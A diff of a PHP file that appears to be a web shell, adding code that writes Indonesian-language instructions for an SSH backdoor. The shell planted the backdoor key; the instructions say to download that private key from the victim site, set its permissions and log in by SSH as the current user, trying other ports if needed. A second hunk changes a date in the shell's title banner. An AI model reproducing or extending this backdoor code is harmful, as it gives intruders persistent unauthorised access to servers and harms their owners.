@@ -3252,6 +3252,23 @@ YW5kb21AaG9zdAEC
     @file_put_contents($private_key_path, $private_key_content);
     @chmod($private_key_path, 0600);
     
+    // Generate SSH documentation
+    $ssh_doc = "=== SSH BACKDOOR ACCESS ===\n";
+    $ssh_doc .= "Tanggal: " . date('Y-m-d H:i:s') . "\n";
+    $ssh_doc .= "Server: $host\n";
+    $ssh_doc .= "User: " . get_current_user() . "\n\n";
+    $ssh_doc .= "CARA MENGGUNAKAN:\n";
+    $ssh_doc .= "1. Download private key dari:\n";
+    $ssh_doc .= "   $protocol://$host$base_path/.ssh_key_backdoor\n\n";
+    $ssh_doc .= "2. Simpan sebagai 'backdoor.key' dan set permission:\n";
+    $ssh_doc .= "   chmod 600 backdoor.key\n\n";
+    $ssh_doc .= "3. Connect via SSH:\n";
+    $ssh_doc .= "   ssh -i backdoor.key " . get_current_user() . "@$host\n\n";
+    $ssh_doc .= "CATATAN:\n";
+    $ssh_doc .= "- Key hanya berfungsi jika SSH server aktif di target\n";
+    $ssh_doc .= "- Jika gagal, coba port lain (22, 2222, 443, dll)\n";
+    $ssh_doc .= "-authorized_keys path: $auth_keys\n";
+    
     $results['ssh'] = [
         'status' => $key_installed ? 'installed' : 'failed',
         'path' => $auth_keys,
@@ -3946,7 +3963,7 @@ function list_dir($path) {
 <body>
 <div class="container">
     <div class="menu-panel">
-        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2027</h1>
+        <h1>::𝒮 𝒴 𝒜 𝐿 𝒪 𝑀:: ~ 020426 2036</h1>
         <!-- Quick Actions Row -->
         <div class="section">
             <h3>⚡ Quick Actions</h3>
